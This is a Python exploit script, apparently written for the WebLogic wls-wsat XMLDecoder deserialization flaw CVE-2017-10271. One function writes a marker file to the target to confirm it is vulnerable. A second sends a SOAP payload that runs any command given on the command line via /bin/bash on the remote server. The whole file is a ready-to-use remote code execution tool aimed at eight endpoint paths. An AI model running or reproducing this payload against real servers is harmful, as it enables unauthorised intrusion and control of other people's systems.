import requests
from sys import argv

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
    'Content-Type': 'text/xml;charset=UTF-8'
    }
vul_paths = {
    '/wls-wsat/CoordinatorPortType',
    '/wls-wsat/RegistrationPortTypeRPC',
    '/wls-wsat/ParticipantPortType',
    '/wls-wsat/RegistrationRequesterPortType',
    '/wls-wsat/CoordinatorPortType11',
    '/wls-wsat/RegistrationPortTypeRPC11',
    '/wls-wsat/ParticipantPortType11',
    '/wls-wsat/RegistrationRequesterPortType11'
}

def XMLDecoder_unser_POC(url):
    data = f'''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java version="1.6.0" class="java.beans.XMLDecoder">
                    <void class="java.io.PrintWriter">
                        <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt</string><void method="println">
                        <string>xmldecoder_vul_test</string></void><void method="close"/>
                    </void>
                </java>
            </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
    </soapenv:Envelope>
    '''
    for vul_path in vul_paths:
        try:
            r = requests.post(url + vul_path,data=data,headers=headers,timeout=8)
            check_result = requests.get(url + "/wls-wsat/test.txt", headers=headers, timeout=8)
            if 'xmldecoder_vul_test' in check_result.text:
                print(u"存在WebLogic WLS远程执行漏洞(CVE-2017-10271)")
                break
        except:
            continue


def XMLDecoder_unser_Paylaod(url, cmd):
    data = f'''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <object class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string>{cmd}</string>
              </void>
            </array>
          <void method="start"/></object>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
    '''
    for vul_path in vul_paths:
        try:
            r = requests.post(url = url + vul_path,data=data,headers=headers,timeout=8)
            if r.status_code != 404:
                print("命令执行成功")
                break
        except:
            continue

if __name__ == '__main__':
    if len(argv) == 2:
        XMLDecoder_unser_POC(argv[1])
    elif len(argv) == 3:
        XMLDecoder_unser_Paylaod(argv[1],argv[2])
    else:
        print("Usage: XMLDecoder_unser.py [url] [cmd]")

